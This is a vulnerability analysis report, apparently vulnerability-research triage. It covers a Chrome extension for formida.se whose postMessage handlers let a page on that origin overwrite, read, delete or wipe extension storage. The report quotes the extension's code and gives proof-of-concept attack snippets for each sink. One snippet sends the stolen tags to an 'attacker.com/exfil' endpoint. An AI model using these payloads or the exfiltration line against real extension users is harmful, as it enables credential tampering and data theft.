# CoCo Analysis: cfnipddegoknjdoaakegpjnifdjgnhlk

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** Multiple (storage_sync_set, storage_local_remove, storage_clear, window_postMessage)

---

## Sink 1: cs_window_eventListener_message → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/cfnipddegoknjdoaakegpjnifdjgnhlk/opgen_generated_files/cs_2.js
Line 469: `window.addEventListener("message", function(event) {`
Line 476-477: `(event.data.session_id !== undefined) && (event.data.username !== undefined)`

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/cfnipddegoknjdoaakegpjnifdjgnhlk/opgen_generated_files/bg.js
Line 978: `chrome.storage.sync.set({'auth':c.auth,'identifier':c.session_id,'username':c.username,'stadie':c.meta_data.billing_skoltyp,'metaData':c.meta_data}`

**Code:**

```javascript
// Content script (cs_2.js Line 469-483) - Entry point
window.addEventListener("message", function(event) {
    if (event.source != window)
        return;

    // Origin check (but IGNORE per methodology)
    if ( (event.origin == "https://my.formida.se"|| event.origin == "https://my.formida.se" || event.origin == "https://api.formida.se") &&
        (event.data.session_id !== undefined) &&
        (event.data.username !== undefined)) {
         port.postMessage(event.data); // ← attacker-controlled data forwarded
    }
}, false);

// Background script (bg.js Line 974-981) - Message handler
chrome.runtime.onConnect.addListener(function (e){
    e.onMessage.addListener(function(c){
        if(c.session_id !== undefined && c.username !== undefined) {
            chrome.storage.sync.set({
                'auth':c.auth,  // ← attacker-controlled
                'identifier':c.session_id,  // ← attacker-controlled
                'username':c.username,  // ← attacker-controlled
                'stadie':c.meta_data.billing_skoltyp,  // ← attacker-controlled
                'metaData':c.meta_data  // ← attacker-controlled
            }, function(){
                console.log("Credentials set");
            });
        }
    });
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** postMessage

**Attack:**

```javascript
// From https://my.formida.se or https://api.formida.se
window.postMessage({
    session_id: "malicious_session",
    username: "attacker",
    auth: "fake_auth_token",
    meta_data: {
        billing_skoltyp: "premium",
        // other fields
    }
}, "*");
```

**Impact:** Storage poisoning - attacker can overwrite authentication credentials and session data. While the origin is restricted to my.formida.se and api.formida.se, per methodology CRITICAL RULE #1, even if only ONE specific domain can exploit it, this is TRUE POSITIVE. An attacker controlling my.formida.se (via XSS or compromised subdomain) can poison the extension's storage.

---

## Sink 2: storage_sync_get_source → window_postMessage_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/cfnipddegoknjdoaakegpjnifdjgnhlk/opgen_generated_files/bg.js
Line 727-728: CoCo framework code for storage_sync_get_source

Actual extension code:
Line 1002: `chrome.storage.sync.get(["tag1","tag2","tag3"], function(tags){`

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/cfnipddegoknjdoaakegpjnifdjgnhlk/opgen_generated_files/cs_1.js
Line 478: `window.postMessage({flippyTags:request.tags},'https://my.formida.se');`

**Code:**

```javascript
// Background script (bg.js Line 1000-1007) - getTags handler
chrome.runtime.onConnect.addListener(function (e){
    e.onMessage.addListener(function(c){
        // ...
        if(c=="getTags"){
            console.log(e.sender.tab);
            chrome.storage.sync.get(["tag1","tag2","tag3"], function(tags){
                console.log(tags);
                chrome.tabs.sendMessage(e.sender.tab.id, {tags:tags}, function(response) {
                    // sends storage data to content script
                });
            });
        }
    });
});

// Content script (cs_1.js Line 468-479) - Receives and forwards to webpage
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    if (request.tags) {
        localStorage.setItem("tags",JSON.stringify(request.tags));
        window.postMessage({flippyTags:request.tags},'https://my.formida.se'); // ← leaks storage to webpage
    }
});

// Content script cs_2.js (Line 492-493) - Trigger from webpage
window.addEventListener("message", function(event) {
    // ...
    else if((event.origin == "https://my.formida.se") && (event.data === "getTags"))
        port.postMessage("getTags"); // ← attacker triggers read
}, false);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** postMessage + Information Disclosure

**Attack:**

```javascript
// From https://my.formida.se webpage
// Step 1: Trigger storage read
window.postMessage("getTags", "*");

// Step 2: Listen for response
window.addEventListener("message", function(event) {
    if (event.data.flippyTags) {
        console.log("Stolen tags:", event.data.flippyTags);
        // Send to attacker server
        fetch("https://attacker.com/exfil", {
            method: "POST",
            body: JSON.stringify(event.data.flippyTags)
        });
    }
});
```

**Impact:** Information disclosure - attacker from my.formida.se can trigger retrieval of stored tags (tag1, tag2, tag3) and receive them back via postMessage, completing a full storage exploitation chain. This allows reading of potentially sensitive tag data stored by the extension. Per methodology, even though restricted to one domain, this is TRUE POSITIVE.

---

## Sink 3: cs_window_eventListener_message → chrome_storage_local_remove_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/cfnipddegoknjdoaakegpjnifdjgnhlk/opgen_generated_files/cs_2.js
Line 481: `(event.data !== undefined && event.data.purge !== undefined)`

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/cfnipddegoknjdoaakegpjnifdjgnhlk/opgen_generated_files/bg.js
Line 982-988: Storage removal operations

**Code:**

```javascript
// Content script (cs_2.js Line 480-482)
window.addEventListener("message", function(event) {
    // ...
    else if((event.origin == "https://my.formida.se") &&
        (event.data !== undefined && event.data.purge !== undefined)) {
          port.postMessage(event.data); // ← attacker-controlled purge command
    }
}, false);

// Background (bg.js Line 981-988)
chrome.runtime.onConnect.addListener(function (e){
    e.onMessage.addListener(function(c){
        // ...
        else if(c.purge !== undefined){
            if (c.purge == "moments")
                chrome.storage.sync.remove(['tag2','tag3']);
            else if (c.purge == "groups")
                chrome.storage.sync.remove(['tag1','tag2','tag3']);
            else if (c.purge == "students")
                chrome.storage.sync.remove(['tag3']);
        }
    });
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** postMessage + Storage Manipulation

**Attack:**

```javascript
// From https://my.formida.se
window.postMessage({purge: "groups"}, "*"); // Removes tag1, tag2, tag3
```

**Impact:** Denial of service - attacker can remove stored tags, disrupting extension functionality. Per methodology CRITICAL RULE #1, even though restricted to my.formida.se, this is TRUE POSITIVE.

---

## Sink 4: cs_window_eventListener_message → chrome_storage_clear_sink

**CoCo Trace:**
Multiple detections of storage.local.clear() and storage.sync.clear()

**Code:**

```javascript
// Content script (cs_2.js Line 484-486)
window.addEventListener("message", function(event) {
    // ...
    else if((event.origin == "https://my.formida.se") &&
        (event.data !== undefined && event.data.logout !== undefined)) {
          port.postMessage({logout:event.data.logout});
    }
}, false);

// Background (bg.js Line 997-999)
else if(c.logout !== undefined && c.logout===true) {
    chrome.storage.local.clear();
    chrome.storage.sync.clear();
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** postMessage + Storage Manipulation

**Attack:**

```javascript
// From https://my.formida.se
window.postMessage({logout: true}, "*");
```

**Impact:** Complete storage wipe - attacker can clear all extension storage, causing data loss and forcing user re-authentication. Per methodology CRITICAL RULE #1, even though restricted to my.formida.se, this is TRUE POSITIVE.
